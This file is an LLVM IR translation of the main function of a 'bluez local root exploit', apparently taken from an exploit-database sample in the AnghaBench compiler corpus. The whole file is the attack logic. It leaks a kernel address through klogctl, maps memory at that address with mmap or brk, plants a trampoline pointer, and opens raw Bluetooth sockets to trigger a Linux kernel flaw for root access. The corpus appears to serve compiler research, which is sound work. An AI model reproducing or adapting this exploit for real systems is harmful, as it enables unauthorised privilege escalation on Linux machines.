; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_926.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_926.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.utsname = type { i8* }

@gid = common dso_local global i32 0, align 4
@uid = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [54 x i8] c"-|-bluez local root exploit v.0.9  -by qobaiashi-\0A |\0A\00", align 1
@.str.1 = private unnamed_addr constant [39 x i8] c" |- couldn't determine kernel version\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c" |- i've found kernel %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [25 x i8] c" |- trampoline is at %p\0A\00", align 1
@load_highlevel = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [6 x i8] c"ecx: \00", align 1
@.str.5 = private unnamed_addr constant [14 x i8] c" |- [%0.14s]\0A\00", align 1
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_READ = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [35 x i8] c" |- suitable value found!using %p\0A\00", align 1
@.str.7 = private unnamed_addr constant [46 x i8] c" |- the time has come to push the button... \0A\00", align 1
@.str.8 = private unnamed_addr constant [25 x i8] c" |- could not mmap   %p\0A\00", align 1
@.str.9 = private unnamed_addr constant [25 x i8] c" |- could not brk to %p\0A\00", align 1
@.str.10 = private unnamed_addr constant [35 x i8] c" `-------------------------------\0A\00", align 1
@AF_BLUETOOTH = common dso_local global i32 0, align 4
@SOCK_RAW = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [15 x i8] c" |- trying...\0A\00", align 1
@.str.12 = private unnamed_addr constant [42 x i8] c" |- something went w0rng (invalid value)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [2048 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca %struct.utsname, align 8
  %14 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %16 = bitcast i8* %15 to i32*
  store i32* %16, i32** %8, align 8
  store i32* null, i32** %9, align 8
  %17 = call i32 (...) @getgid()
  store i32 %17, i32* @gid, align 4
  %18 = call i32 (...) @getuid()
  store i32 %18, i32* @uid, align 4
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str, i64 0, i64 0))
  %20 = call i64 @uname(%struct.utsname* %13)
  %21 = icmp slt i64 %20, 0
  br i1 %21, label %22, label %24

22:                                               ; preds = %2
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  br label %28

24:                                               ; preds = %2
  %25 = getelementptr inbounds %struct.utsname, %struct.utsname* %13, i32 0, i32 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0), i8* %26)
  br label %28

28:                                               ; preds = %24, %22
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.3, i64 0, i64 0), i32* @load_highlevel)
  %30 = load i32, i32* %4, align 4
  %31 = icmp slt i32 %30, 2
  br i1 %31, label %32, label %38

32:                                               ; preds = %28
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 0
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @usage(i8* %35)
  %37 = call i32 @exit(i32 1) #3
  unreachable

38:                                               ; preds = %28
  %39 = load i32, i32* %4, align 4
  %40 = icmp eq i32 %39, 2
  br i1 %40, label %41, label %46

41:                                               ; preds = %38
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @strtoul(i8* %44, i32 0, i32 0)
  store i32 %45, i32* %10, align 4
  br label %46

46:                                               ; preds = %41, %38
  %47 = call i64 (...) @fork()
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %142

49:                                               ; preds = %46
  %50 = call i32 @usleep(i32 1000)
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %52 = call i32 @klogctl(i32 3, i8* %51, i32 1700)
  store i32 %52, i32* %11, align 4
  %53 = icmp sgt i32 %52, -1
  br i1 %53, label %54, label %141

54:                                               ; preds = %49
  %55 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %56 = call i8* @strstr(i8* %55, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  store i8* %56, i8** %12, align 8
  %57 = load i8*, i8** %12, align 8
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i64 0, i64 0), i8* %57)
  %59 = load i8*, i8** %12, align 8
  %60 = getelementptr inbounds i8, i8* %59, i64 5
  store i8* %60, i8** %12, align 8
  %61 = load i8*, i8** %12, align 8
  %62 = getelementptr inbounds i8, i8* %61, i64 9
  store i8 0, i8* %62, align 1
  %63 = load i8*, i8** %12, align 8
  %64 = getelementptr inbounds i8, i8* %63, i32 -1
  store i8* %64, i8** %12, align 8
  store i8 120, i8* %64, align 1
  %65 = load i8*, i8** %12, align 8
  %66 = getelementptr inbounds i8, i8* %65, i32 -1
  store i8* %66, i8** %12, align 8
  store i8 48, i8* %66, align 1
  %67 = load i8*, i8** %12, align 8
  %68 = call i32 @strtoul(i8* %67, i32 0, i32 0)
  %69 = zext i32 %68 to i64
  %70 = inttoptr i64 %69 to i32*
  store i32* %70, i32** %8, align 8
  %71 = load i32*, i32** %8, align 8
  store i32* %71, i32** %14, align 8
  %72 = load i32*, i32** %8, align 8
  %73 = ptrtoint i32* %72 to i32
  %74 = and i32 %73, -4096
  %75 = sext i32 %74 to i64
  %76 = inttoptr i64 %75 to i32*
  store i32* %76, i32** %8, align 8
  %77 = load i32*, i32** %8, align 8
  %78 = bitcast i32* %77 to i8*
  %79 = load i32, i32* @PROT_WRITE, align 4
  %80 = load i32, i32* @PROT_READ, align 4
  %81 = or i32 %79, %80
  %82 = load i32, i32* @MAP_SHARED, align 4
  %83 = load i32, i32* @MAP_ANONYMOUS, align 4
  %84 = or i32 %82, %83
  %85 = load i32, i32* @MAP_FIXED, align 4
  %86 = or i32 %84, %85
  %87 = call i32* @mmap(i8* %78, i32 8192, i32 %81, i32 %86, i32 0, i32 0)
  store i32* %87, i32** %9, align 8
  %88 = load i32*, i32** %9, align 8
  %89 = load i32*, i32** %8, align 8
  %90 = icmp eq i32* %88, %89
  br i1 %90, label %91, label %105

91:                                               ; preds = %54
  %92 = load i32*, i32** %8, align 8
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.6, i64 0, i64 0), i32* %92)
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %95

95:                                               ; preds = %101, %91
  %96 = load i32, i32* %7, align 4
  %97 = icmp sle i32 %96, 1
  br i1 %97, label %98, label %104

98:                                               ; preds = %95
  %99 = load i32*, i32** %14, align 8
  %100 = getelementptr inbounds i32, i32* %99, i32 1
  store i32* %100, i32** %14, align 8
  store i32 ptrtoint (i32* @load_highlevel to i32), i32* %99, align 4
  br label %101

101:                                              ; preds = %98
  %102 = load i32, i32* %7, align 4
  %103 = add nsw i32 %102, 1
  store i32 %103, i32* %7, align 4
  br label %95

104:                                              ; preds = %95
  br label %132

105:                                              ; preds = %54
  %106 = load i32*, i32** %8, align 8
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0), i32* %106)
  %108 = load i32*, i32** %8, align 8
  %109 = bitcast i32* %108 to i8*
  %110 = getelementptr i8, i8* %109, i64 512
  %111 = call i32 @brk(i8* %110)
  %112 = icmp eq i32 %111, -1
  br i1 %112, label %113, label %118

113:                                              ; preds = %105
  %114 = load i32*, i32** %8, align 8
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.9, i64 0, i64 0), i32* %114)
  %116 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.10, i64 0, i64 0))
  %117 = call i32 @exit(i32 -1) #3
  unreachable

118:                                              ; preds = %105
  %119 = load i32*, i32** %8, align 8
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.6, i64 0, i64 0), i32* %119)
  %121 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.7, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %122

122:                                              ; preds = %128, %118
  %123 = load i32, i32* %7, align 4
  %124 = icmp sle i32 %123, 1
  br i1 %124, label %125, label %131

125:                                              ; preds = %122
  %126 = load i32*, i32** %14, align 8
  %127 = getelementptr inbounds i32, i32* %126, i32 1
  store i32* %127, i32** %14, align 8
  store i32 ptrtoint (i32* @load_highlevel to i32), i32* %126, align 4
  br label %128

128:                                              ; preds = %125
  %129 = load i32, i32* %7, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %7, align 4
  br label %122

131:                                              ; preds = %122
  br label %132

132:                                              ; preds = %131, %104
  %133 = load i32, i32* @AF_BLUETOOTH, align 4
  %134 = load i32, i32* @SOCK_RAW, align 4
  %135 = load i32, i32* %10, align 4
  %136 = call i32 @socket(i32 %133, i32 %134, i32 %135)
  store i32 %136, i32* %7, align 4
  %137 = icmp slt i32 %136, 0
  br i1 %137, label %138, label %140

138:                                              ; preds = %132
  %139 = call i32 @exit(i32 1) #3
  unreachable

140:                                              ; preds = %132
  br label %141

141:                                              ; preds = %140, %49
  ret i32 0

142:                                              ; preds = %46
  %143 = call i64 (...) @fork()
  %144 = icmp eq i64 %143, 0
  br i1 %144, label %145, label %156

145:                                              ; preds = %142
  %146 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.11, i64 0, i64 0))
  %147 = load i32, i32* @AF_BLUETOOTH, align 4
  %148 = load i32, i32* @SOCK_RAW, align 4
  %149 = load i32, i32* %10, align 4
  %150 = call i32 @socket(i32 %147, i32 %148, i32 %149)
  store i32 %150, i32* %7, align 4
  %151 = icmp slt i32 %150, 0
  br i1 %151, label %152, label %155

152:                                              ; preds = %145
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.12, i64 0, i64 0))
  %154 = call i32 @exit(i32 1) #3
  unreachable

155:                                              ; preds = %145
  br label %156

156:                                              ; preds = %155, %142
  %157 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @uname(%struct.utsname*) #1

declare dso_local i32 @usage(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strtoul(i8*, i32, i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @klogctl(i32, i8*, i32) #1

declare dso_local i8* @strstr(i8*, i8*) #1

declare dso_local i32* @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @brk(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
